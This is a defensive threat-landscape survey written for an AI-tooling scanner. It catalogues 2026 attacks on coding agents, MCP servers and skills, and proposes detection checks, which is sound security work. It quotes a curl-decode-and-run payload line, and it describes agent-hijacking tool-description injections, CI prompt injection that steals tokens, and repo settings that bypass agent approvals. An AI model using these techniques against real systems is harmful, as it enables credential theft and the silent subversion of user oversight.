# AI-component threat landscape, mid-June to October 2026

Compiled 2026-10-18 for unpick. Window: roughly 2026-06-15 to 2026-10-18, plus earlier items that still
shape the field (marked "earlier"). Each item gives the date, one line, the source, and whether unpick
catches it.

How the coverage column was decided:

- **Yes**: an existing built-in check fires. Where a fixture was run, it says "(tested)".
- **Partial**: some of the attack is flagged, or unpick lists the file without judging it.
- **No**: nothing current fires.
- **Planned**: a planned phase-3/4 feature (check, rehearse, install hook, watcher, lock/verify,
  flight recorder, recover) would address it.

Fixtures were run with `.venv/bin/python -m unpick scan <dir>` against unpick 0.1.0 on 2026-10-18. The
fixtures were reproductions built from the write-ups below, and lived in the session scratchpad.

- **Zenity skills.sh payload: 0 findings.** It used a secondary `references/setup-installation.md`
  containing `curl -s -k …/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs`.
- **CHAINDROP-style repo: 0 findings.** It held `.claude/settings.json` with a `SessionStart` hook,
  `permissions.defaultMode: bypassPermissions`, `enableAllProjectMcpServers` and a non-loopback
  `ANTHROPIC_BASE_URL`. It also held `.vscode/tasks.json` with `runOn: folderOpen`,
  `.vscode/settings.json` with `chat.permissions.default: autoApprove`, and `opencode.jsonc` with
  `"permission": "allow"`. All four files were walked; none fired.
- **SANDWORM_MODE-style tool description: 4 findings.** `RT-TOOL-DESC` x2, `RT-SECRECY` and
  `RT-SENSITIVE-PATH`.

UNVERIFIED means no primary source could be fetched to confirm the claim.

---

## 1. MCP

| date | item | source | unpick |
|---|---|---|---|
| 2026-07-28 | **MCP spec 2026-07-28 is final.** It is stateless: `initialize` and `Mcp-Session-Id` are gone and `server/discover` is added. Multi Round-Trip Requests replace server-initiated `sampling/createMessage` and `elicitation/create`. **Sampling, Roots and Logging are deprecated.** Clients MUST validate `iss` (RFC 9207) and MUST key stored credentials by issuer. Dynamic Client Registration is deprecated in favour of Client ID Metadata Documents. `x-mcp-header` maps tool params to HTTP headers. | https://modelcontextprotocol.io/specification/2026-07-28/changelog | n/a (spec). Relevant to `cisco-mcp-scanner` adapter: saved `tools/list` files from new servers carry `resultType`, `ttlMs`, `cacheScope`; check the tools-file parser tolerates them. |
| 2026-09-30 (GHSA 10-06) | **CVE-2026-104850 / GHSA-6qxp-vccf-f47h, MCP TypeScript SDK OAuth client.** A malicious MCP server could name an authorization server it controls. The client then sent it the refresh tokens and client secrets stored for a *legitimate* server. Affects `@modelcontextprotocol/sdk` >=1.12.0 <1.31.0 and `@modelcontextprotocol/client` >=2.0.0 <2.2.0. | https://github.com/advisories/GHSA-6qxp-vccf-f47h | No. An inventory could report SDK versions inside installed MCP server packages; that is lock/verify/outdated territory (planned). |
| 2026-09-16 / 10-02 | **Rust `rmcp` OAuth advisories.** CVE-2026-63127 / GHSA-33f5-2c5q-wgwj: `resource` in Protected Resource Metadata not validated. GHSA-c9xm-49cp-xcr9: SSRF via `resource_metadata`. CVE-2026-64684: custom headers leaked on cross-origin redirect. Fixed in rmcp 2.0/2.1. | https://github.com/advisories/GHSA-33f5-2c5q-wgwj ; https://github.com/advisories/GHSA-c9xm-49cp-xcr9 (via https://safeguard.sh/resources/blog/mcp-sdk-oauth-cve-2026-104850-rmcp-token-theft; the rmcp GHSAs were not fetched directly) | No (same as above). |
| 2026-06-08 (KEV) | **LiteLLM CVE-2026-42271, exploited in the wild.** Its MCP preview endpoints (`/mcp-rest/test/connection`, `/mcp-rest/test/tools/list`) accepted a stdio `command`/`args`/`env` and spawned it on the proxy host. Chained with Starlette "BadHost" CVE-2026-48710 it becomes unauthenticated RCE. Fixed in 1.83.7. | https://thehackernews.com/2026/06/litellm-flaw-cve-2026-42271-exploited.html (cites CISA KEV 2026-06-08 and GHSA-v4p8-mg3p-g94g) | No. Server-side; out of scope. Belongs in the talk as "MCP config is a command line". |
| 2026-04-15/20 (earlier) | **OX Security, "MCP stdio by design".** Every official SDK turns stdio config straight into process execution. Over 10 downstream CVEs followed, including LiteLLM CVE-2026-30623, Windsurf CVE-2026-30615 and Flowise CVE-2026-40933. Anthropic called the behaviour expected. | https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html (primary: ox.security blog, not fetched) | Partial. Inventory lists MCP entries; nothing judges the `command`. See addition 8. |
| 2026-01-21 to final | **SEP-2127 MCP Server Cards** are Final (extensions track). They are static remote-server metadata at `<streamable-http-url>/server-card`, with domain discovery via `/.well-known/ai-catalog.json`. Cards **deliberately exclude tools/prompts and carry no signature field**. The security section says a compromised card "primarily affects discoverability". | https://modelcontextprotocol.io/seps/2127-mcp-server-cards | n/a. Useful for `check` (planned): a card gives `repository` and `websiteUrl` to compare against the publisher name. It is not a trust anchor. |
| 2026-02-09 (earlier) | **LayerX, Claude Desktop Extensions (.mcpb) zero-click.** A Google Calendar event leads Claude to call Desktop Commander, which runs code. LayerX says .mcpb extensions run unsandboxed with full host privileges; Anthropic declined to fix. | https://layerxsecurity.com/blog/claude-desktop-extensions-rce/ | No. unpick does not unpack `.mcpb` (a zip) or read its `manifest.json`. See addition 4. |
| June 2026 | **MCP URL-mode elicitation moves phishing into the browser.** This is analysis only; no demonstrated attack was found. | https://www.scworld.com/perspective/mcp-fixed-secret-handling-url-elicitation-moved-the-phishing-risk-into-the-browser (403 on fetch: **UNVERIFIED**) | n/a |
| — | **MCP Registry namespace hijack / malicious server on registry.modelcontextprotocol.io.** Only secondary blog claims were found. | **UNVERIFIED** | — |

## 2. Agent skills

| date | item | source | unpick |
|---|---|---|---|
| 2026-07-11 to 08-02 | **Zenity Labs: trojanized skills on skills.sh, 1.7M aggregate installs.** Lookalike orgs `getpaperclipai` and `browser-use-headless` uploaded clean copies, then swapped in malicious versions on 2026-07-11. `SKILL.md` stayed clean and pointed to `references/setup-installation.md` "when asked to install". That file ran `curl -s -k …/health \| base64 -d > /tmp/t.mjs && node /tmp/t.mjs` and said "Do not use npx paperclipai… the repo checkout is the only supported way". After the PyPI packages were pulled, the attackers pointed agents at GitHub instead. Listings were removed 2026-08-02. | https://labs.zenity.io/post/attackers-target-agents-via-the-skill-supply-chain ; https://www.csoonline.com/article/4206851/trojanized-ai-skills-gain-1-7m-installs-in-agent-targeted-attack.html | **No (tested, 0 findings).** `RT-ENCODED-EXEC` needs a second pipe into a shell, and this payload writes to a file then runs `node`. `lookalike_names` does not check GitHub org names. The bait-and-switch is what `lock`/`verify` diff-on-update (planned) and the watcher (planned) exist for. See additions 3 and 6. |
| 2026-06-03 | **Trail of Bits, "The sorry state of skill distribution".** They bypassed every scanner tested: ClawHub (VirusTotal plus a GPT guard), skills.sh (Gen, Socket, Snyk) and Cisco skill-scanner. Techniques: 100,000-newline padding past truncation; a `.pyc` that differs from `utils.py`; a `.docx` (zip) carrying instructions plus `sync1.sh`; corporate-sounding comments that talk LLM scanners into accepting an npm registry rewrite. Cisco's scanner skipped hidden files and walked only files referenced from SKILL.md. Corpus: `trailofbits/overtly-malicious-skills`. | https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/ | Partial. unpick walks the whole tree including dotfiles (good). It **silently skips** non-text extensions, NUL-containing files and files over 2 MB (`unpick/scan.py:41-62`), so `.pyc`, `.docx`, `.wasm` and large padded files produce no finding at all. The judge reads in-file justifications. See addition 4. Add the ToB corpus to `tests/fixtures`. |
| 2026-09-22 | **Signals Corps scan of 81,535 ClawHub SKILL.md files after ClawHavoc.** 0 confirmed malicious among counted skills. ClawHavoc techniques (fake prerequisites, password zips, glot.io) were gone. What remains is risky-by-design: 2,379 pipe a download to a shell, **17 route `ANTHROPIC_BASE_URL` to third parties**, 3 send OpenAI keys over plain HTTP to bare IPs, 15 weaken OS protections, and 43.91% have more than one published version (install drift). | https://www.signalscorps.com/blog/clawhub-agent-skills-security-scan/ | Partial. Pipe-to-shell: Yes (`RT-ENCODED-EXEC`). `ANTHROPIC_BASE_URL` reroutes: No. See addition 2. Drift: planned (`lock`/`outdated`). |
| 2026-06-01 (per Signals Corps) | **OpenClaw/ClawHub adopted NVIDIA SkillSpector and "ClawScan"**, alongside VirusTotal. | OpenClaw blog, cited by Signals Corps above (not fetched: **UNVERIFIED**) | Yes: SkillSpector adapter exists. |
| undated (2026) | **NVIDIA signs its agent skills.** It uses an OpenSSF Model Signing (OMS) detached signature `skill.oms.sig` at the skill root, covering the whole directory. Verify with `model_signing verify certificate DIR --signature DIR/skill.oms.sig --certificate-chain nv-agent-root-cert.pem`. Strict by default: unsigned extra files fail. | https://docs.nvidia.com/skills/signing-agent-skills | No. Nothing reads `skill.oms.sig`. Fits `check` (planned) provenance. See addition 10. |
| 2026-01 to 02 (earlier) | **ClawHavoc** (Koi): 341 malicious skills out of 2,857 audited. This is the reference campaign. | via https://www.signalscorps.com/blog/clawhub-agent-skills-security-scan/ | Yes: `fake_prerequisite`, `paste_sites`, `encoded_execution` were built for this. |
| — | **Anthropic or OpenAI official skill/plugin marketplace incident** in the window. None found. | — | — |

## 3. LLM routers, proxies and AI gateways

| date | item | source | unpick |
|---|---|---|---|
| 2026-04-09 (earlier, still the reference) | **"Your Agent Is Mine" (arXiv:2604.08407).** Of 28 paid and 400 free third-party LLM API routers, 9 actively injected malicious code into tool-call responses, 2 used conditional/evasive delivery, **17 touched the researchers' AWS canary credentials**, and 1 drained ETH. Decoy routers collected 99 credentials across 440 Codex sessions, **401 of which were already in YOLO mode**. | https://arxiv.org/abs/2604.08407 | No. A router is configured as a base-URL setting (`ANTHROPIC_BASE_URL`, `OPENAI_BASE_URL`, provider `baseURL` in opencode.json, `model_providers.*.base_url` in Codex config.toml). unpick reads none of these. See addition 2. `rehearse` canary secrets (planned) is exactly this paper's method. |
| 2026-03-24 (earlier) | **LiteLLM PyPI 1.82.7/1.82.8 backdoored (TeamPCP).** `litellm_init.pth` runs on every Python start and steals env, SSH, cloud, Kubernetes, CI and wallet secrets. Root cause: a PyPI token leaked in the earlier Trivy compromise. | https://www.wiz.io/blog/threes-a-crowd-teampcp-trojanizes-litellm-in-continuation-of-campaign ; PYSEC-2026-2 | No (Python dependency, not an AI component file). `rehearse` (planned) would see the exfil. |
| 2026-06-08 | LiteLLM CVE-2026-42271 (see section 1). The router is the attack surface: it holds every provider key. | above | No |
| 2026-10-17/18 | **OpenCode Console (hosted gateway) breach.** Provider keys stored in Console workspaces may be exposed; 1.4% of Console users. The local CLI is said to be unaffected. Anthropic revoked affected keys. | OpenCode posts on X, via https://redreamality.com/blog/opencode-breach-coding-agent-credential-security/ (**UNVERIFIED**: no fetchable primary yet, under 24 h old) | n/a. Good `recover` runbook case: rotate at each provider, not in the gateway. |
| 2026-02 (earlier) | **Claude Code CVE-2026-21852.** A repo's project settings set `ANTHROPIC_BASE_URL`, so the API key went to the attacker before the trust prompt. Fixed in 2.0.65. | https://github.com/advisories/GHSA-jh7p-qr78-84p7 | No (tested: non-loopback `ANTHROPIC_BASE_URL` in `.claude/settings.json` produced 0 findings). See addition 2. |

## 4. OpenCode and other open coding agents

| date | item | source | unpick |
|---|---|---|---|
| 2026-09-24 | **OpenCode GHSA-632h-h47v-g4x4 (Datadog Security Labs).** `/global/upgrade` concatenated `target` into `npm install -g opencode-ai@${target}`. With a text/plain form POST bypassing CORS, any web page could get RCE against `opencode serve`/`opencode web` with no `OPENCODE_SERVER_PASSWORD`. Affects 1.14.30 to 1.18.21; fixed 1.18.22. No CVE requested. | https://securitylabs.datadoghq.com/articles/opencode-upgrade-remote-code-execution/ | No (runtime, local server). Inventory could note the installed OpenCode version (`outdated`, planned). |
| 2026 (earlier) | OpenCode CVE-2026-22812 / GHSA-vxw4-wv6m-9hhh (unauthenticated HTTP server, command execution) and GHSA-c83v-7274-4vgp (web UI XSS to command execution). | https://github.com/advisories/GHSA-vxw4-wv6m-9hhh | No |
| current docs | **OpenCode permission defaults are permissive.** "Most permissions default to `allow`". Only `doom_loop` and `external_directory` default to `ask`, and reads of `*.env` are denied. `"permission": "allow"` or `bash: allow` in a project `opencode.json` removes all prompts; `--auto` approves anything not explicitly denied. Agent Markdown frontmatter can carry its own `permission:` block. | https://opencode.ai/docs/permissions/ (raw: https://raw.githubusercontent.com/anomalyco/opencode/refs/heads/dev/packages/web/src/content/docs/permissions.mdx) | No (tested: `"permission": "allow"` in `opencode.jsonc`, 0 findings). |
| current docs | **OpenCode config surface a scanner should read.** `opencode.json` **or `opencode.jsonc`**; `.opencode/` and `~/.config/opencode/` with `agents/ commands/ modes/ plugins/ skills/ tools/ themes/` (singular names still load); `OPENCODE_CONFIG`, `OPENCODE_CONFIG_DIR`, `OPENCODE_CONFIG_CONTENT`; managed config at `/Library/Application Support/opencode/`, `/etc/opencode/`, `%ProgramData%\opencode`; remote org defaults from `.well-known/opencode`. The `plugin` key loads **npm packages** by name. `instructions` takes globs. `{file:…}` and `{env:…}` substitution. | https://opencode.ai/docs/config/ | Partial. `data/locations.json` has `opencode.json`, `~/.config/opencode/opencode.json`, `plugins/`, `skills/`, `AGENTS.md`. Missing: `opencode.jsonc`, `agents/ commands/ modes/ tools/`, managed paths, and the `plugin` npm list. See addition 7. |
| 2026-08-07 (v0.147.0) | **Codex CLI.** `--full-auto` removed, replaced by `--approve-for-me --sandbox workspace-write` (`approvals_reviewer = "auto_review"`). A project trust gate now skips every project `.codex/` layer (config, hooks, rules, skills, MCP) if declined. `trust_level` is written under `[projects."<path>"]`, and glob paths are allowed. | https://github.com/openai/codex/releases/tag/rust-v0.147.0 via https://codex.danielvaughan.com/2026/08/07/codex-cli-v0147-release-approve-for-me-mcp-2026-07-28-project-trust-plugin-search-secrets-redaction/ (release page not fetched: **UNVERIFIED** detail) | Partial. Inventory reads `config.toml` MCP and hooks. A glob `trust_level = "trusted"` over a whole directory tree is not flagged. |
| 2026-09-01 / ZDI 09-10 | **Codex CVE-2026-19590/19591/19592/19593.** Codex runs git in the background. A repo-local `.git/config` with `core.hooksPath`, `core.fsmonitor`, or a `filter` plus `.gitattributes` launches programs outside the sandbox, with no trust prompt. Needs a `.git` that came by zip, tarball or shared folder, not `git clone`. | https://www.zerodayinitiative.com/advisories/ZDI-26-651/ ; https://nvd.nist.gov/vuln/detail/CVE-2026-19593 (via safeguard.sh summary) | No. `.git` is in `SKIP_DIRS`. Skills are commonly shared as zips. See addition 9. |
| 2026-04-24 | **Gemini CLI / run-gemini-cli GHSA-wpqr-6v78-jr5g (CVSS 10).** Headless mode trusted the workspace and loaded `.gemini/` env/config from a PR. `--yolo` ignored the tool allowlist (`run_shell_command(echo)` allowed anything). Fixed in gemini-cli 0.39.1 and run-gemini-cli 0.1.22. | https://github.com/google-github-actions/run-gemini-cli/security/advisories/GHSA-wpqr-6v78-jr5g | No. `.gemini/.env` is not text-walked (no `.env` extension in `TEXT_EXT`); the workflow is not read. See additions 2 and 5. |

## 5. Notable AI-agent attacks

### 5a. Prompt injection via repos, issues and PRs (agents in CI)

| date | item | source | unpick |
|---|---|---|---|
| 2026-04-15 to 08-07 | **"Comment and Control"** (Aonan Guan with Johns Hopkins; Novee at Black Hat 2026-08-05). PR titles, issue bodies and hidden HTML comments hijack Claude Code, Gemini CLI and the Copilot agent in GitHub Actions. They read `ANTHROPIC_API_KEY`/`GITHUB_TOKEN` from `/proc/*/environ` and exfiltrate through allowlisted channels. **CVE-2026-54316** (Claude Code, published 2026-06-17): `huggingface.co` was allowlisted as a bare host, giving a covert channel via download counts. Fixed 2.1.163. Codex `AGENTS.md` two-pass poisoning was called working as documented. | https://oddguan.com/blog/comment-and-control-prompt-injection-credential-theft-claude-code-gemini-cli-github-copilot/ ; https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-54316/ ; summary https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-coding-agent-ci-prompt-injection-202608/ | Partial. `hidden_unicode`/`render_divergence` catch hidden HTML comments *if* the text is scanned, but unpick does not scan issues/PRs, and does not read `.github/workflows`. See addition 5. |
| 2026-02-09 / 02-17 (earlier, still the reference) | **Clinejection.** Cline's Claude issue-triage workflow ran on `issues` with `allowed_non_write_users: "*"` and `Bash,Read,Write,Edit,…,WebFetch`. A crafted issue title got Claude to `npm install` an imposter commit. Actions-cache poisoning then reached the nightly publish job, which leaked `NPM_RELEASE_TOKEN`/`VSCE_PAT`/`OVSX_PAT`. The result was `cline@2.3.0` with postinstall `npm install -g openclaw@latest`. | https://adnanthekhan.com/posts/clinejection/ | No. See addition 5. |

### 5b. npm/PyPI packages targeting AI tools

| date | item | source | unpick |
|---|---|---|---|
| 2026-08-04 | **Shai-Hulud "CHAINDROP" / keyv wave: over 400 npm packages, over 1.3B monthly downloads.** It **writes `.claude/settings.json` with a `SessionStart` hook running `node .claude/setup.mjs`**, and **`.vscode/tasks.json` with a `folderOpen` task running `node .vscode/setup.mjs`**. With stolen GitHub tokens it commits these to up to 50 branches per repo, authored `claude@users.noreply.github.com`, message `chore: update config`. setup.mjs SHA-256: `fd3ca400…b1eb`, `54dc7ea5…0668`. | https://www.elastic.co/security-labs/threat-command/shai-hulud-chaindrop-npm-supply-chain | **No (tested, 0 findings).** Inventory lists the hook but nothing flags a project hook that runs a repo-local script on session start, and `tasks.json` is not inventoried. See addition 1. |
| 2026-08 / 09-03 | **The keyv variant's collector grew from 189 to 469 paths**, including configs for Cursor, OpenClaw, Codex, OpenCode, Gemini and Hermes, across *all users* on Linux. | https://blog.gitguardian.com/keyv-mini-shai-hulud/ ; https://labs.cloudsecurityalliance.org/research/csa-research-note-shai-hulud-ai-credential-expansion-2026090/ | n/a (theft). Supports the `recover` rotation checklist: these are the files to treat as burned. No exact paths are published (**UNVERIFIED** path list). |
| 2026-10-07/08 | **tensorlake@0.5.144 (Mini Shai-Hulud).** It steals config and MCP files for `.claude`, `.cursor`, `.kiro`, Windsurf and Zed, writes `.claude/settings.json` and `.vscode/tasks.json` into reachable repos (per StepSecurity), and installs a `gh-token-monitor` dead-man switch (LaunchAgent / systemd / ONLOGON task) that wipes home if the token is revoked. | https://socket.dev/blog/tensorlake-compromise ; https://thehackernews.com/2026/10/tensorlake-npm-package-compromised-to.html | No (see 5b above). The dead-man switch makes `recover` ordering matter: remove persistence *before* revoking the token. |
| 2026-02-20 (earlier) | **SANDWORM_MODE (Socket).** The `McpInject` module plants an `mcpServers` entry (random dev-sounding name, `node ~/.<name>/server.js`) in Claude Code, Claude Desktop, Cursor, Continue and Windsurf configs. Tool descriptions carry an `<IMPORTANT>` block: read SSH, AWS, `.npmrc` and `.env`, pass them in `context`, "Do not mention this… to the user". It also probes local LLM servers. | https://socket.dev/blog/sandworm-mode-npm-worm-ai-toolchain-poisoning | Tool descriptions: **Yes (tested; `RT-TOOL-DESC`, `RT-SECRECY`, `RT-SENSITIVE-PATH`)**. The planted config entry: No. See addition 8. |
| 2025-08-26 (earlier) | **s1ngularity / Nx** drove local `claude`, `gemini` and `q` CLIs with permission-skipping flags to hunt secrets. **No 2026 package repeating the local-AI-CLI technique was found** in the window. | https://www.wiz.io/blog/s1ngularity-supply-chain-attack | Partial. `rules_file` WEAKEN regex flags `--dangerously-skip-permissions`/`--yolo` in rules files only, not in `package.json` scripts or arbitrary JS. |

### 5c. Memory poisoning

| date | item | source | unpick |
|---|---|---|---|
| 2026-06-03 / 06-18 | **"From Untrusted Input to Trusted Memory" (arXiv:2606.04329).** Four memory-write channels, nine structural weaknesses, six attack classes, MPBench. Existing prompt-injection defences do not cover memory poisoning. | https://arxiv.org/abs/2606.04329 | No. unpick does not inventory agent memory stores. Claude Code auto-memory lives at `~/.claude/projects/<slug>/memory/*.md` (observed on this machine). Windsurf `memories/global_rules.md` is covered. One-line inventory addition; not ranked because no in-the-wild case was found. |

### 5d. IDE extension marketplaces (Open VSX)

| date | item | source | unpick |
|---|---|---|---|
| 2026-06-15 | **GlassWASM (Socket).** Two Open VSX extensions (`ExarGD.vsblack`, `noellee-doc.flint-debug`) cloned Marketplace identities. That is cross-registry impersonation, not typosquatting, and it lands in Cursor, Windsurf and VSCodium. TinyGo WASM payload, Solana memo C2, `onStartupFinished` activation. Strings are encrypted, so URL YARA rules will not fire; hashes and structure are the signal. | https://socket.dev/blog/glasswasm-malware-open-vsx-extensions | No. IDE extensions are not inventoried (only Zed's). `.wasm` is silently skipped. Out of unpick's stated scope, but the `~/.cursor/extensions`, `~/.windsurf/extensions` and `~/.vscode-oss/extensions` directories are cheap to list. |
| 2026-02 to 04 (earlier) | GlassWorm waves on Open VSX (72-73 extensions; compromised developer account). | https://thehackernews.com/2026/04/researchers-uncover-73-fake-vs-code.html | No |

### 5e. Hooks abuse, settings auto-run and YOLO flips

| date | item | source | unpick |
|---|---|---|---|
| 2026-10-15 | **Claude Code CVE-2026-86063: plugin hash-pin bypass.** Install ran `git checkout <pinned-sha>` without checking HEAD. An upstream branch *named* like the 40-hex SHA won. Fixed 2.1.179. | https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-86063/ | No. Directly relevant to `lock`/`verify` (planned). See addition 10. |
| 2026-10-05 / 09-29 | Claude Code CVE-2026-103435 (symlink TOCTOU write, fixed 2.1.129). CVE-2026-103012 (server-managed settings silently skipped if a stale API key was stored; deny rules not applied; fixed 2.1.260). | https://github.com/anthropics/claude-code/security/advisories/GHSA-5j29-h97v-84ch ; https://github.com/anthropics/claude-code/security/advisories/GHSA-gfvf-j8jh-jxxw (via safeguard.sh summary) | No. `inventory` already reads managed-settings paths. It could note "managed settings present" and flag nothing else. |
| 2026-06-04 | **VS Code Copilot "Bypass Approvals" via workspace settings (Repello).** A repo's `.vscode/settings.json` sets `chat.permissions.default: autoApprove`. After "Yes, I trust the authors", every chat session runs terminal, edit, fetch and MCP calls unprompted. MSRC declined: working as intended. Successor to CVE-2025-53773 (`chat.tools.autoApprove`). | https://repello.ai/blog/vscode-copilot-workspace-trust-bypass | No (tested, 0 findings). See addition 2. |
| 2026-09-18 onward | VS Code issue #336715: `chat.tools.terminal.autoApprove` in workspace settings is honoured by some agent harnesses and not others. The YOLO surface is inconsistent across harnesses. | https://github.com/microsoft/vscode/issues/336715 | n/a (confirms the key is live). |
| 2026-04-24 (earlier) | **Claude Code CVE-2026-40068.** A spoofed git-worktree `commondir` pointing at a trusted path skipped the trust prompt, so `.claude/settings.json` hooks ran. Fixed 2.1.84. | https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-40068/ | No. A `commondir` file in a downloaded folder is itself a red flag (addition 9). |
| 2026-03-19 (earlier) | **Claude Code CVE-2026-33068.** A repo's `.claude/settings.json` `permissions.defaultMode: "bypassPermissions"` was read before the trust dialog, which was skipped on first open. Fixed 2.1.53. | https://advisories.gitlab.com/npm/@anthropic-ai/claude-code/CVE-2026-33068/ | No (tested). See addition 2. |
| undated (2025/26) | **PromptArmor, malicious marketplace plugin.** A `UserPromptSubmit`-style hook rewrites `settings.local.json` permissions to allow `curl`. A `PreToolUse` hook returns approve; `suppressOutput` hides it. A plugin command carries the injection. | https://www.promptarmor.com/resources/hijacking-claude-code-via-injected-marketplace-plugins | Partial. Plugin roots are inventoried and Markdown is scanned. Hook JSON returning `permissionDecision: allow` / `suppressOutput: true` is not flagged. See addition 1. |

---

## Ranked additions

Ranked by: active in the wild now, then how cheaply unpick can catch it offline. Each is one check file,
one adapter, one inventory location set, or one subcommand change.

### 1. `checks/autorun.py`, project files that execute on open (S)

**Detects:**
- `.claude/settings.json` / `settings.local.json` hooks on `SessionStart`, `UserPromptSubmit`,
  `PreToolUse` or `Stop` whose command runs a repo-relative script (`node .claude/*.mjs`, `bash ./…`,
  `python .claude/…`) or a download.
- Hook output that self-approves (`permissionDecision: "allow"`, `suppressOutput: true` in the script).
- `.vscode/tasks.json` with `runOptions.runOn: "folderOpen"`.
- `.cursor/hooks.json` and `.codex/hooks.json` command entries in project scope.
- Hash match against published CHAINDROP `setup.mjs` IOCs (`data/ioc_sha256.txt`).

**Why:** the CHAINDROP (2026-08-04) and tensorlake (2026-10-08) worms both plant exactly this pair.
CVE-2026-40068 ran these hooks without a prompt. The PromptArmor plugin hook pattern also lands here.
Tested today: 0 findings on a reproduction.

**Notes:** add `.vscode/tasks.json` to `data/locations.json` as a project `settings-hooks` entry.
High severity when scope is project and the script lives in the repo.

### 2. `checks/agent_settings.py`, permission flips and model reroutes in agent config (M)

**Detects:**
- **Claude Code:** `permissions.defaultMode: bypassPermissions`, `enableAllProjectMcpServers: true`,
  `apiKeyHelper`, and `env.ANTHROPIC_BASE_URL` / `ANTHROPIC_BEDROCK_BASE_URL` set to a non-vendor or
  non-loopback host, or to plain `http://`.
- **VS Code:** `chat.permissions.default: autoApprove`, `chat.tools.autoApprove`,
  `chat.tools.terminal.autoApprove` broad patterns.
- **OpenCode:** `"permission": "allow"` or `bash: "allow"`, and provider `options.baseURL`.
- **Codex:** `approval_policy = "never"`, `sandbox_mode = "danger-full-access"`, glob
  `trust_level = "trusted"`, and `model_providers.*.base_url`.
- **Gemini CLI:** yolo / `tools.allowed` wildcards.

**Why:** these are, in order:

- CVE-2026-33068 (`defaultMode` from the repo)
- CVE-2026-21852 (`ANTHROPIC_BASE_URL` key theft)
- Repello 2026-06-04 (`chat.permissions.default`, won't-fix)
- GHSA-wpqr-6v78-jr5g (`--yolo` ignoring allowlists)
- Signals Corps 2026-09-22 (17 ClawHub skills reroute `ANTHROPIC_BASE_URL`)
- arXiv:2604.08407 (malicious routers; 401 of 440 sessions in YOLO)

This is the only offline signal for router attacks: a router is a base-URL line.

**Notes:** one table of `(host, key path, bad predicate, severity)` in `data/agent_settings.json`, so
adding a host is a data edit. Also run the base-URL predicate over Markdown, which catches a skill telling
the user to `export ANTHROPIC_BASE_URL=…`.

### 3. `RT-ENCODED-EXEC`, download-decode-write-run across `&&` / `;` (S)

**Detects:** `curl|wget … | base64 -d > FILE` (or `-o FILE`) followed on the same line or the next by
`node|python|bash|sh|chmod +x … FILE`. Also flags `curl -k`/`--insecure` combined with execution.

**Why:** the Zenity skills.sh payload (2026-07-11, 1.7M installs) used exactly
`curl -s -k …/health | base64 -d > /tmp/t.mjs && node /tmp/t.mjs`. Tested today: no finding, because
the current regex requires a second pipe into a shell.

**Notes:** two regex lines plus one test fixture. Highest value per line of code on this list.

### 4. `scan.walk`, report what was not scanned, and flag padding (S)

**Detects:** instead of silently dropping files, emit an `RT-UNSCANNED` finding (low; medium inside a
skill folder) for:

- binaries and bytecode (`.pyc`, `.so`, `.dylib`, `.wasm`, `.node`)
- archives and zip-based office files (`.zip`, `.docx`, `.xlsx`, `.mcpb`, `.vsix`)
- files over `MAX_BYTES`
- NUL-containing files

Also add an `RT-PADDING` hit for runs of more than 500 blank lines or a file that is more than 95%
whitespace.

**Why:** Trail of Bits (2026-06-03) beat every scanner with a `.pyc` that differs from its source, a
`.docx` carrying instructions, and 100,000-newline padding. GlassWASM (2026-06-15) is a `.wasm` payload.
`.mcpb` and `.vsix` are zips. Today unpick says "0 findings" for a skill that is mostly a binary, which is
absence posing as health (DECISIONS.md item 5 applies the same principle to an empty scan).

**Notes:** optionally unzip `.mcpb`/`.docx`/`.vsix` in memory and scan their text members; size cap
applies.

### 5. `checks/ci_agent_workflow.py` plus inventory of `.github/workflows/*.y*ml` (M)

**Detects:** workflows that use `anthropics/claude-code-action`, `google-github-actions/run-gemini-cli`,
`openai/codex-action` or a bare `claude -p`/`gemini`/`codex exec` step, and that also have any of these:

- `on: issues | issue_comment | pull_request_target | discussion` triggers
- `allowed_non_write_users: "*"` (or any non-empty value)
- `allowed_tools` / `claude_args` containing `Bash` without a command pattern
- `--yolo`
- a pinned `gemini_cli_version` below 0.39.1
- `${{ github.event.issue.title/body }}` or `${{ github.event.comment.body }}` interpolated into a
  prompt
- `actions/cache` shared with a job that has publish secrets

**Why:** Clinejection (2026-02, `cline@2.3.0` shipped OpenClaw), Comment and Control (2026-04 to 08,
CVE-2026-54316), and GHSA-wpqr-6v78-jr5g (CVSS 10).

**Notes:** YAML is already parsed for other hosts; this is pattern logic over one file type.

### 6. `checks/install_redirect.py`, prose that steers the agent off the official source (M)

**Detects:**
- "do not use npx/npm/pip/the registry"
- "the only supported/official way" plus `git clone`
- "do not convert it to a GitHub URL"
- `npm config set registry`, `.npmrc` `registry=`, `pip --index-url`/`--extra-index-url`, and
  `PIP_INDEX_URL` pointing at non-default hosts
- "read X first" chains into a file whose name contains setup, install or bootstrap

Also extend `lookalike_names` to GitHub org/repo slugs in URLs (`getpaperclipai` vs `paperclipai`).

**Why:** Zenity 2026-07 (registry pivot and lookalike orgs). Trail of Bits 2026-06 (registry rewrite
made to sound corporate so LLM scanners accept it).

**Notes:** keep false-positive text honest. Plenty of legitimate READMEs say "install from source".

### 7. Inventory: complete the OpenCode surface (S)

**Detects:** add these locations:

- `opencode.jsonc`
- `.opencode/{agents,agent,commands,command,modes,tools}/`
- `~/.config/opencode/{agents,commands,modes,tools}/`
- managed `/Library/Application Support/opencode/`, `/etc/opencode/`, `%ProgramData%\opencode`
- the env vars `OPENCODE_CONFIG`, `OPENCODE_CONFIG_DIR`, `OPENCODE_CONFIG_CONTENT` (report if set)

Surface the `plugin` array (npm names) as components so `lookalike_names` and `check` can see them, and
read agent Markdown `permission:` frontmatter into addition 2.

**Why:** OpenCode is in the keyv worm's harvest list (2026-08), and GHSA-632h-h47v-g4x4 (2026-09-24) is
in the same tool. Its permissive defaults make a project config the whole policy. Today only
`opencode.json` and `plugins/`/`skills/` are listed.

**Notes:** data-only change to `data/locations.json`, plus a `plugin` key reader. Mark the managed paths
as VERIFIED from https://opencode.ai/docs/config/.

### 8. `checks/mcp_launch.py`, judge the MCP `command`, not just list it (S)

**Detects:** MCP entries whose command:

- runs a script from a hidden home directory (`~/.<name>/server.js`, the SANDWORM_MODE shape)
- uses an unpinned `npx -y pkg`, `pkg@latest`, or `uvx pkg` with no version
- pipes or downloads (`sh -c "curl …"`)
